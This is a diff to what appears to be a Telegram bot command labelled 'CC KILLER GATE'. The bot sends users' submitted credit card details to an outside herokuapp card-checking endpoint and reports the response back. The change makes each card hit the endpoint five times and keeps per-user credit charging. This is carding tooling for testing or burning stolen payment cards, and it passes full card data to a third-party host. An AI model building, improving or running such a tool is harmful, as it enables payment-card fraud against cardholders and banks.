@@ -65,12 +65,9 @@ def kill_gate(client, message):
     # Initial processing message
     processing_message = message.reply_text("**CC KILLER GATE\nProcessing your request...**")
 
-    results = []
+    final_result = ""
 
-    for i in range(1):
-        # Step message (not editing but updating results list)
-        results.append(f"**Processing request {i+1}**")
-
+    for i in range(5):  # Loop to check 5 times
         time.sleep(1)  # Adjust the delay if needed
 
         url = f"https://ugin-376ec3a40d16.herokuapp.com/cvv?cc={card_details}"
@@ -82,7 +79,7 @@ def kill_gate(client, message):
             error_code = data["error"]["code"]
             error_message = data["error"]["message"]
 
-            result = f"""
+            final_result = f"""
 **┏━━━━━━━⍟
 ┃#CC KILL GATE ☠️
 ┗━━━━━━━━━━━⊛
@@ -90,15 +87,13 @@ CARD:- {full_card_details}
 RESPONSE:- {error_code}
 MSG:- {error_message}**
 """
-            results.append(result)
         else:
-            results.append("**Failed to connect to the API. Please try again later.**")
+            final_result = "**Failed to connect to the API. Please try again later.**"
 
         if not is_owner:
             user_credits[user_id] -= 1
 
-    # Send the final result after all checks
-    final_result = "\n".join(results)
+    # Send only the last result after all checks
     processing_message.edit_text(final_result)
 
 app.run()
